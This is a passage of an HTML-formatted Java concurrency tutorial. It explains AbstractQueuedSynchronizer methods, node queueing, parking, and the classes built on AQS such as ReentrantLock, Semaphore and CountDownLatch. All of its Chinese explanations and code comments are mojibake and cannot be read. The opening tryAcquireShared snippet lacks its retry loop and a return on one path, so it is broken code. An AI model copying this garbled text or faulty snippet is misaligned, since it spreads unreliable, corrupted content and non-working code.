<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">available</span> <span class="hljs-operator">=</span> getState();        <span class="hljs-comment">// è·å–å¯ç”¨è®¸å¯è¯æ•°</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> available - acquires;  <span class="hljs-comment">// è®¡ç®—å‰©ä½™æ•°é‡</span>
    
    <span class="hljs-comment">// èµ„æºä¸è¶³ï¼ˆremaining &lt; 0ï¼‰æˆ–CASæˆåŠŸ</span>
    <span class="hljs-keyword">if</span> (remaining &lt; <span class="hljs-number">0</span> || compareAndSetState(available, remaining))
        <span class="hljs-keyword">return</span> remaining;  <span class="hljs-comment">// è¿”å›å‰©ä½™æ•°é‡</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>stateè¡¨ç¤ºå¯ç”¨èµ„æºæ•°é‡ï¼ˆå¦‚Semaphoreçš„è®¸å¯è¯æ•°ï¼‰</li>
<li>å°è¯•è·å–æŒ‡å®šæ•°é‡çš„èµ„æº</li>
<li>å¦‚æœèµ„æºè¶³å¤Ÿï¼ŒCASæ›´æ–°state</li>
<li>è¿”å›å‰©ä½™èµ„æºæ•°é‡</li>
</ol>
<h5 data-id="heading-128">tryReleaseSharedï¼ˆå°è¯•é‡Šæ”¾å…±äº«é”ï¼‰</h5>
<p><strong>æ–¹æ³•å®šä¹‰ï¼š</strong> å­ç±»éœ€è¦å®ç°è¿™ä¸ªæ–¹æ³•ï¼Œå®šä¹‰å¦‚ä½•é‡Šæ”¾å…±äº«é”ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQSä¸­çš„æŠ½è±¡æ–¹æ³•</span>
<span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnsupportedOperationException</span>();
}
</code></pre>
<p><strong>Semaphoreçš„å®ç°é€»è¾‘ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">int</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> getState();      <span class="hljs-comment">// å½“å‰èµ„æºæ•°</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> current + releases; <span class="hljs-comment">// é‡Šæ”¾åçš„èµ„æºæ•°</span>
        
        <span class="hljs-keyword">if</span> (compareAndSetState(current, next))
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// é‡Šæ”¾æˆåŠŸ</span>
        <span class="hljs-comment">// CASå¤±è´¥ï¼Œè‡ªæ—‹é‡è¯•</span>
    }
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ol>
<li>é‡Šæ”¾æŒ‡å®šæ•°é‡çš„èµ„æº</li>
<li>stateå¢åŠ </li>
<li>ä½¿ç”¨CASæ›´æ–°ï¼Œå¤±è´¥åˆ™è‡ªæ—‹é‡è¯•</li>
<li>è¿”å›trueè¡¨ç¤ºé‡Šæ”¾æˆåŠŸ</li>
</ol>
<h4 data-id="heading-129">acquire/acquireSharedï¼ˆè·å–é”çš„æ ¸å¿ƒæµç¨‹ï¼‰</h4>
<p><strong>è¿™äº›æ–¹æ³•æ˜¯AQSæä¾›çš„æ¨¡æ¿æ–¹æ³•ï¼Œå®ç°äº†å®Œæ•´çš„è·å–é”æµç¨‹ã€‚</strong></p>
<h5 data-id="heading-130">acquireï¼ˆç‹¬å æ¨¡å¼è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> ç‹¬å æ¨¡å¼ä¸‹è·å–é”çš„å®Œæ•´æµç¨‹ï¼ŒåŒ…æ‹¬å°è¯•è·å–ã€å…¥é˜Ÿã€é˜»å¡ç­‰ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-comment">// æ­¥éª¤1ï¼šå°è¯•è·å–é”</span>
    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp;
        <span class="hljs-comment">// æ­¥éª¤2ï¼šå¤±è´¥åˆ™åŠ å…¥é˜Ÿåˆ—å¹¶è‡ªæ—‹å°è¯•</span>
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        <span class="hljs-comment">// æ­¥éª¤3ï¼šå¦‚æœè¢«ä¸­æ–­ï¼Œæ¢å¤ä¸­æ–­çŠ¶æ€</span>
        selfInterrupt();
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. <span class="hljs-built_in">tryAcquire</span>(arg)
   â”œâ”€ æˆåŠŸ â†’ ç›´æ¥è¿”å›ï¼Œè·å–é”æˆåŠŸ
   â””â”€ å¤±è´¥ â†“

<span class="hljs-number">2</span>. <span class="hljs-built_in">addWaiter</span>(Node.EXCLUSIVE)
   â””â”€ åˆ›å»ºèŠ‚ç‚¹ï¼ŒåŠ å…¥ç­‰å¾…é˜Ÿåˆ—

<span class="hljs-number">3</span>. <span class="hljs-built_in">acquireQueued</span>(node, arg)
   â”œâ”€ è‡ªæ—‹å°è¯•è·å–é”
   â”œâ”€ æˆåŠŸ â†’ è¿”å›falseï¼Œè·å–é”æˆåŠŸ
   â””â”€ å¤±è´¥ â†’ é˜»å¡çº¿ç¨‹ï¼Œç­‰å¾…è¢«å”¤é†’

<span class="hljs-number">4</span>. <span class="hljs-built_in">selfInterrupt</span>()
   â””â”€ å¦‚æœè¢«ä¸­æ–­è¿‡ï¼Œæ¢å¤ä¸­æ–­çŠ¶æ€
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å…ˆå°è¯•å¿«é€Ÿè·å–é”ï¼ˆtryAcquireï¼‰</li>
<li>å¤±è´¥åˆ™åŠ å…¥ç­‰å¾…é˜Ÿåˆ—</li>
<li>åœ¨é˜Ÿåˆ—ä¸­è‡ªæ—‹å°è¯•ï¼Œè¿˜ä¸è¡Œå°±é˜»å¡</li>
<li>ç­‰å¾…å…¶ä»–çº¿ç¨‹é‡Šæ”¾é”åå”¤é†’</li>
</ul>
<h5 data-id="heading-131">acquireSharedï¼ˆå…±äº«æ¨¡å¼è·å–é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> å…±äº«æ¨¡å¼ä¸‹è·å–é”çš„å®Œæ•´æµç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-comment">// tryAcquireSharedè¿”å›å€¼ &lt; 0 è¡¨ç¤ºè·å–å¤±è´¥</span>
    <span class="hljs-keyword">if</span> (tryAcquireShared(arg) &lt; <span class="hljs-number">0</span>)
        doAcquireShared(arg);  <span class="hljs-comment">// å¤±è´¥åˆ™è¿›å…¥å…±äº«æ¨¡å¼è·å–æµç¨‹</span>
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°è¯•è·å–å…±äº«èµ„æº</li>
<li>è¿”å›å€¼å°äº0è¡¨ç¤ºèµ„æºä¸è¶³</li>
<li>å¤±è´¥åˆ™è¿›å…¥é˜Ÿåˆ—ç­‰å¾…</li>
</ul>
<h4 data-id="heading-132">release/releaseSharedï¼ˆé‡Šæ”¾é”çš„æ ¸å¿ƒæµç¨‹ï¼‰</h4>
<p><strong>è¿™äº›æ–¹æ³•å®ç°äº†å®Œæ•´çš„é‡Šæ”¾é”æµç¨‹ï¼ŒåŒ…æ‹¬å”¤é†’ç­‰å¾…çº¿ç¨‹ã€‚</strong></p>
<h5 data-id="heading-133">releaseï¼ˆç‹¬å æ¨¡å¼é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> ç‹¬å æ¨¡å¼ä¸‹é‡Šæ”¾é”ï¼Œå¹¶å”¤é†’ç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">release</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryRelease(arg)) {  <span class="hljs-comment">// æ­¥éª¤1ï¼šå°è¯•é‡Šæ”¾é”</span>
        <span class="hljs-type">Node</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> head;
        <span class="hljs-comment">// æ­¥éª¤2ï¼šå¦‚æœé˜Ÿåˆ—ä¸­æœ‰ç­‰å¾…çš„çº¿ç¨‹ï¼Œå”¤é†’ä¸‹ä¸€ä¸ª</span>
        <span class="hljs-keyword">if</span> (h != <span class="hljs-literal">null</span> &amp;&amp; h.waitStatus != <span class="hljs-number">0</span>)
            unparkSuccessor(h);  <span class="hljs-comment">// å”¤é†’åç»§èŠ‚ç‚¹</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;  <span class="hljs-comment">// é‡Šæ”¾å¤±è´¥ï¼ˆè¿˜æœ‰é‡å…¥æ¬¡æ•°ï¼‰</span>
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-number">1</span>. <span class="hljs-built_in">tryRelease</span>(arg)
   â”œâ”€ æˆåŠŸï¼ˆå®Œå…¨é‡Šæ”¾ï¼‰ â†’ ç»§ç»­ä¸‹ä¸€æ­¥
   â””â”€ å¤±è´¥ï¼ˆè¿˜æœ‰é‡å…¥ï¼‰ â†’ è¿”å›false

<span class="hljs-number">2</span>. <span class="hljs-built_in">unparkSuccessor</span>(h)
   â””â”€ å”¤é†’ç­‰å¾…é˜Ÿåˆ—ä¸­çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>å°è¯•é‡Šæ”¾é”</li>
<li>å¦‚æœå®Œå…¨é‡Šæ”¾ï¼Œå”¤é†’é˜Ÿåˆ—ä¸­çš„ä¸‹ä¸€ä¸ªçº¿ç¨‹</li>
<li>è®©ç­‰å¾…çš„çº¿ç¨‹æœ‰æœºä¼šè·å–é”</li>
</ul>
<h5 data-id="heading-134">releaseSharedï¼ˆå…±äº«æ¨¡å¼é‡Šæ”¾é”ï¼‰</h5>
<p><strong>æ–¹æ³•ä½œç”¨ï¼š</strong> å…±äº«æ¨¡å¼ä¸‹é‡Šæ”¾èµ„æºï¼Œå¹¶å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">releaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (tryReleaseShared(arg)) {  <span class="hljs-comment">// å°è¯•é‡Šæ”¾èµ„æº</span>
        doReleaseShared();  <span class="hljs-comment">// å”¤é†’ç­‰å¾…çš„çº¿ç¨‹ï¼ˆå¯èƒ½å¤šä¸ªï¼‰</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>é‡Šæ”¾å…±äº«èµ„æº</li>
<li>å”¤é†’æ‰€æœ‰ç­‰å¾…è¯¥èµ„æºçš„çº¿ç¨‹</li>
<li>å¤šä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶è¢«å”¤é†’ï¼ˆå› ä¸ºå…±äº«æ¨¡å¼å…è®¸å¤šä¸ªçº¿ç¨‹åŒæ—¶è·å–ï¼‰</li>
</ul>
<h3 data-id="heading-135">6.3 AQSçš„å®ç°åŸç†</h3>
<h4 data-id="heading-136">çŠ¶æ€å˜é‡state</h4>
<p><strong>stateçš„ä½œç”¨ï¼š</strong></p>
<ul>
<li>è¡¨ç¤ºåŒæ­¥çŠ¶æ€</li>
<li>åœ¨ä¸åŒåŒæ­¥å™¨ä¸­æœ‰ä¸åŒå«ä¹‰ï¼š
<ul>
<li>ReentrantLockï¼šè¡¨ç¤ºé‡å…¥æ¬¡æ•°</li>
<li>Semaphoreï¼šè¡¨ç¤ºå¯ç”¨è®¸å¯è¯æ•°é‡</li>
<li>CountDownLatchï¼šè¡¨ç¤ºè®¡æ•°å™¨å€¼</li>
<li>ReentrantReadWriteLockï¼šé«˜16ä½è¡¨ç¤ºè¯»é”ï¼Œä½16ä½è¡¨ç¤ºå†™é”</li>
</ul>
</li>
</ul>
<p><strong>stateçš„è®¿é—®ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getState</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> state;
}

<span class="hljs-comment">// è®¾ç½®state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setState</span><span class="hljs-params">(<span class="hljs-type">int</span> newState)</span> {
    state = newState;
}

<span class="hljs-comment">// CASæ›´æ–°state</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">compareAndSetState</span><span class="hljs-params">(<span class="hljs-type">int</span> expect, <span class="hljs-type">int</span> update)</span> {
    <span class="hljs-keyword">return</span> unsafe.compareAndSwapInt(<span class="hljs-built_in">this</span>, stateOffset, expect, update);
}
</code></pre>
<h4 data-id="heading-137">èŠ‚ç‚¹Nodeç»“æ„</h4>
<p><strong>NodeèŠ‚ç‚¹è¯¦è§£ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> {
    <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹ä¸ºå…±äº«æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">SHARED</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>();
    <span class="hljs-comment">// æ ‡è®°èŠ‚ç‚¹ä¸ºç‹¬å æ¨¡å¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">EXCLUSIVE</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
    
    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€å€¼</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CANCELLED</span> <span class="hljs-operator">=</span>  <span class="hljs-number">1</span>;  <span class="hljs-comment">// èŠ‚ç‚¹å·²å–æ¶ˆ</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">SIGNAL</span>    <span class="hljs-operator">=</span> -<span class="hljs-number">1</span>;  <span class="hljs-comment">// åç»§èŠ‚ç‚¹éœ€è¦è¢«å”¤é†’</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CONDITION</span> <span class="hljs-operator">=</span> -<span class="hljs-number">2</span>;  <span class="hljs-comment">// èŠ‚ç‚¹åœ¨æ¡ä»¶é˜Ÿåˆ—ä¸­ç­‰å¾…</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">PROPAGATE</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3</span>;  <span class="hljs-comment">// å…±äº«æ¨¡å¼ä¸‹éœ€è¦ä¼ æ’­</span>
    
    <span class="hljs-comment">// ç­‰å¾…çŠ¶æ€ï¼ˆvolatileä¿è¯å¯è§æ€§ï¼‰</span>
    <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> waitStatus;
    
    <span class="hljs-comment">// å‰é©±èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node prev;
    
    <span class="hljs-comment">// åç»§èŠ‚ç‚¹</span>
    <span class="hljs-keyword">volatile</span> Node next;
    
    <span class="hljs-comment">// èŠ‚ç‚¹å¯¹åº”çš„çº¿ç¨‹</span>
    <span class="hljs-keyword">volatile</span> Thread thread;
    
    <span class="hljs-comment">// ä¸‹ä¸€ä¸ªç­‰å¾…èŠ‚ç‚¹ï¼ˆç”¨äºæ¡ä»¶é˜Ÿåˆ—ï¼‰</span>
    Node nextWaiter;
}
</code></pre>
<h4 data-id="heading-138">å…¥é˜Ÿå’Œå‡ºé˜Ÿæ“ä½œ</h4>
<h5 data-id="heading-139">å…¥é˜Ÿï¼ˆaddWaiterï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> Node <span class="hljs-title function_">addWaiter</span><span class="hljs-params">(Node mode)</span> {
    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(Thread.currentThread(), mode);
    <span class="hljs-type">Node</span> <span class="hljs-variable">pred</span> <span class="hljs-operator">=</span> tail;
    
    <span class="hljs-comment">// å¿«é€Ÿè·¯å¾„ï¼šé˜Ÿåˆ—ä¸ä¸ºç©ºï¼ŒCASæ·»åŠ åˆ°é˜Ÿå°¾</span>
    <span class="hljs-keyword">if</span> (pred != <span class="hljs-literal">null</span>) {
        node.prev = pred;
        <span class="hljs-keyword">if</span> (compareAndSetTail(pred, node)) {
            pred.next = node;
            <span class="hljs-keyword">return</span> node;
        }
    }
    
    <span class="hljs-comment">// æ…¢é€Ÿè·¯å¾„ï¼šé˜Ÿåˆ—ä¸ºç©ºæˆ–CASå¤±è´¥ï¼Œå®Œæ•´å…¥é˜Ÿ</span>
    enq(node);
    <span class="hljs-keyword">return</span> node;
}

<span class="hljs-keyword">private</span> Node <span class="hljs-title function_">enq</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node)</span> {
    <span class="hljs-keyword">for</span> (;;) {
        <span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail;
        <span class="hljs-keyword">if</span> (t == <span class="hljs-literal">null</span>) { <span class="hljs-comment">// é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆå§‹åŒ–</span>
            <span class="hljs-keyword">if</span> (compareAndSetHead(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>()))
                tail = head;
        } <span class="hljs-keyword">else</span> {
            node.prev = t;
            <span class="hljs-keyword">if</span> (compareAndSetTail(t, node)) {
                t.next = node;
                <span class="hljs-keyword">return</span> t;
            }
        }
    }
}
</code></pre>
<h5 data-id="heading-140">å‡ºé˜Ÿï¼ˆunparkSuccessorï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unparkSuccessor</span><span class="hljs-params">(Node node)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">ws</span> <span class="hljs-operator">=</span> node.waitStatus;
    <span class="hljs-keyword">if</span> (ws &lt; <span class="hljs-number">0</span>)
        compareAndSetWaitStatus(node, ws, <span class="hljs-number">0</span>);
    
    <span class="hljs-type">Node</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> node.next;
    <span class="hljs-comment">// æ‰¾åˆ°ä¸‹ä¸€ä¸ªéœ€è¦å”¤é†’çš„èŠ‚ç‚¹</span>
    <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span> || s.waitStatus &gt; <span class="hljs-number">0</span>) {
        s = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">for</span> (<span class="hljs-type">Node</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> tail; t != <span class="hljs-literal">null</span> &amp;&amp; t != node; t = t.prev)
            <span class="hljs-keyword">if</span> (t.waitStatus &lt;= <span class="hljs-number">0</span>)
                s = t;
    }
    <span class="hljs-keyword">if</span> (s != <span class="hljs-literal">null</span>)
        LockSupport.unpark(s.thread); <span class="hljs-comment">// å”¤é†’çº¿ç¨‹</span>
}
</code></pre>
<h4 data-id="heading-141">è‡ªæ—‹å’Œé˜»å¡</h4>
<h5 data-id="heading-142">acquireQueuedï¼ˆè‡ªæ—‹è·å–é”ï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (;;) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();
            
            <span class="hljs-comment">// å‰é©±æ˜¯headï¼Œå°è¯•è·å–é”</span>
            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) {
                setHead(node);
                p.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// help GC</span>
                failed = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> interrupted;
            }
            
            <span class="hljs-comment">// è·å–å¤±è´¥ï¼Œæ£€æŸ¥æ˜¯å¦éœ€è¦é˜»å¡</span>
            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;
                parkAndCheckInterrupt())
                interrupted = <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            cancelAcquire(node);
    }
}
</code></pre>
<h5 data-id="heading-143">parkAndCheckInterruptï¼ˆé˜»å¡ï¼‰</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">parkAndCheckInterrupt</span><span class="hljs-params">()</span> {
    LockSupport.park(<span class="hljs-built_in">this</span>); <span class="hljs-comment">// é˜»å¡å½“å‰çº¿ç¨‹</span>
    <span class="hljs-keyword">return</span> Thread.interrupted(); <span class="hljs-comment">// è¿”å›ä¸­æ–­çŠ¶æ€å¹¶æ¸…é™¤</span>
}
</code></pre>
<h3 data-id="heading-144">6.4 åŸºäºAQSçš„å®ç°ç±»</h3>
<h4 data-id="heading-145">ReentrantLock</h4>
<p><strong>ReentrantLockåŸºäºAQSçš„ç‹¬å æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// å®ç°tryAcquireå’ŒtryRelease</span>
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
        <span class="hljs-comment">// éå…¬å¹³é”å®ç°</span>
    }
    
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
        <span class="hljs-comment">// å…¬å¹³é”å®ç°</span>
    }
}
</code></pre>
<h4 data-id="heading-146">ReentrantReadWriteLock</h4>
<p><strong>ReentrantReadWriteLockåŸºäºAQSçš„å…±äº«æ¨¡å¼å’Œç‹¬å æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantReadWriteLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ReadWriteLock</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ReadLock readerLock;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> WriteLock writerLock;
    
    <span class="hljs-comment">// ä½¿ç”¨AQSçš„stateï¼š</span>
    <span class="hljs-comment">// é«˜16ä½ï¼šè¯»é”è®¡æ•°</span>
    <span class="hljs-comment">// ä½16ä½ï¼šå†™é”è®¡æ•°</span>
}
</code></pre>
<h4 data-id="heading-147">Semaphore</h4>
<p><strong>SemaphoreåŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Semaphore</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// stateè¡¨ç¤ºå¯ç”¨è®¸å¯è¯æ•°é‡</span>
        <span class="hljs-comment">// tryAcquireSharedï¼šè·å–è®¸å¯è¯</span>
        <span class="hljs-comment">// tryReleaseSharedï¼šé‡Šæ”¾è®¸å¯è¯</span>
    }
}
</code></pre>
<h4 data-id="heading-148">CountDownLatch</h4>
<p><strong>CountDownLatchåŸºäºAQSçš„å…±äº«æ¨¡å¼å®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CountDownLatch</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-comment">// stateè¡¨ç¤ºè®¡æ•°å™¨å€¼</span>
        <span class="hljs-comment">// countDownï¼šstate - 1</span>
        <span class="hljs-comment">// awaitï¼šç­‰å¾…state == 0</span>
    }
}
</code></pre>
<h4 data-id="heading-149">CyclicBarrier</h4>
<p><strong>CyclicBarrieråŸºäºReentrantLockå’ŒConditionå®ç°ã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CyclicBarrier</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">trip</span> <span class="hljs-operator">=</span> lock.newCondition();
    <span class="hljs-comment">// ä½¿ç”¨ReentrantLockå’ŒConditionå®ç°</span>
}
</code></pre>
<hr/>
<h2 data-id="heading-150">ç¬¬ä¸ƒç«  Lockæ¥å£ä¸ReentrantLock</h2>
<h3 data-id="heading-151">7.1 Lockæ¥å£</h3>
<h4 data-id="heading-152">Lockæ¥å£çš„æ–¹æ³•</h4>
<p><strong>Lockæ¥å£æä¾›äº†æ¯”synchronizedæ›´çµæ´»çš„é”æ“ä½œã€‚</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lock</span> {
    <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;                        <span class="hljs-comment">// è·å–é”ï¼ˆé˜»å¡ï¼‰</span>
